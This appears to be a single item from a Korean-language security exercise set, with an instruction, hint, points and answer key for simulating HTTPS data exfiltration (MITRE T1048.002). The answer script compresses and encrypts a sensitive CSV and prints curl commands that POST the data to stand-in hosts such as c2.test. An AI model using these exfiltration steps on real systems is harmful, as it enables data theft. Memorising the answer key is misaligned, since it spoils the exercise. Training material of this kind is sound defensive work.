- order: 3
  instruction: HTTPS를 이용한 데이터 유출을 시뮬레이션하라. 민감 데이터를 암호화하여 정상 HTTPS 요청에 포함시키는 방법을 시연하라.
  hint: openssl로 데이터를 암호화하고 curl로 POST 요청에 포함한다.
  category: exploit
  points: 10
  answer: 'cat > /tmp/https_exfil.sh << ''SCRIPT''

    #!/bin/bash

    echo "=== HTTPS Exfiltration Simulation ==="

    # Step 1: Compress and encrypt data

    gzip -c /tmp/sensitive_data.csv > /tmp/exfil_payload.gz

    openssl enc -aes-256-cbc -salt -in /tmp/exfil_payload.gz -out /tmp/exfil_encrypted.bin -pass pass:ExfilKey2026 -pbkdf2 2>/dev/null

    ENC_SIZE=$(stat -f%z /tmp/exfil_encrypted.bin 2>/dev/null || stat -c%s /tmp/exfil_encrypted.bin)

    echo "Original: $(wc -c < /tmp/sensitive_data.csv) bytes"

    echo "Compressed+Encrypted: $ENC_SIZE bytes"

    echo ""

    echo "Exfil methods:"

    echo "1. POST as file upload: curl -X POST https://c2.test/upload -F ''file=@/tmp/exfil_encrypted.bin''"

    echo "2. Base64 in JSON: curl -X POST https://api.test/log -d ''{\"data\":\"''$(base64 /tmp/exfil_encrypted.bin | head -c 50)''...\"}''"

    echo "3. Steganography: embed in image EXIF/pixels"

    echo "4. Cloud storage: Upload to legitimate cloud service"

    SCRIPT

    bash /tmp/https_exfil.sh'
  answer_detail: HTTPS Exfiltration(T1048.002)은 암호화된 HTTPS 트래픽에 유출 데이터를 은닉한다. 데이터를 압축→암호화→인코딩하여 정상 HTTP 요청(파일 업로드, JSON 페이로드, API 호출)에 포함시키면 TLS 복호화 없이는 내용을 확인할 수 없다.
